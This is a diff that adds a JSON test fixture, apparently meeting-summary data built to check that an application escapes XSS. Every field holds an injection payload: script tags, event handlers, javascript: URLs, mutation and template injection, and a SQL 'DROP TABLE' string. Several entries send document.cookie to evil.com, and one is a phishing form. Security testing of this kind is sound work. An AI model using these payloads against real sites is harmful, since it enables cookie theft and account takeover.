@@ -1,0 +1,61 @@
+{
+  "title": "<script>alert('XSS in title')</script>",
+  "summary": "<img src=x onerror=alert('XSS-in-summary')> This summary contains malicious payloads to test XSS prevention. <svg onload=alert(1)>",
+  "topics": [
+    {
+      "name": "<script>document.location='http://evil.com/?c='+document.cookie</script>",
+      "insight": "<img src=\"javascript:alert('topic-insight-xss')\" onerror=\"alert('topic-xss')\">",
+      "status": "resolved"
+    },
+    {
+      "name": "javascript:alert('protocol-xss')",
+      "insight": "<svg/onload=alert('svg-xss')>",
+      "status": "ongoing"
+    },
+    {
+      "name": "\"><script>alert('attribute-escape-xss')</script>",
+      "insight": "Normal insight with <b>HTML tags</b> that should be escaped",
+      "status": "postponed"
+    }
+  ],
+  "decisions": [
+    {
+      "decision": "<iframe src=\"javascript:alert('decision-xss')\"></iframe>",
+      "reason": "<a href=\"javascript:void(0)\" onclick=\"alert('reason-xss')\">Click me</a> — This tests event handler injection in decision rationale.",
+      "status": "<script>alert('status-xss')</script>"
+    },
+    {
+      "decision": "{{constructor.constructor('alert(\"template-injection\")')()}}",
+      "reason": "${alert('template-literal-xss')} — Tests template literal injection vectors.",
+      "status": "approved"
+    }
+  ],
+  "actionItems": [
+    {
+      "task": "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
+      "owner": "<img src=x onerror=alert('owner-xss')>",
+      "priority": "high",
+      "dueDate": "2026-06-06\"><script>alert('date-xss')</script>"
+    },
+    {
+      "task": "<details open ontoggle=alert('details-xss')>",
+      "owner": "'; DROP TABLE users; --",
+      "priority": "medium"
+    },
+    {
+      "task": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('mutation-xss')>",
+      "owner": "attacker",
+      "priority": "low"
+    }
+  ],
+  "openQuestions": [
+    "<a href=\"javascript:void(0)\" onclick=\"alert('question-xss')\">Is this safe?</a>",
+    "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
+    "What about <object data=\"javascript:alert('object-xss')\">"
+  ],
+  "unresolvedConflicts": [
+    "{{constructor.constructor('alert(\"conflict-template-injection\")')()}}",
+    "<embed src=\"javascript:alert('embed-xss')\"> — Tests embed tag injection.",
+    "<form action=\"http://evil.com/phish\"><input type=\"submit\" value=\"Click here\"></form>"
+  ]
+}
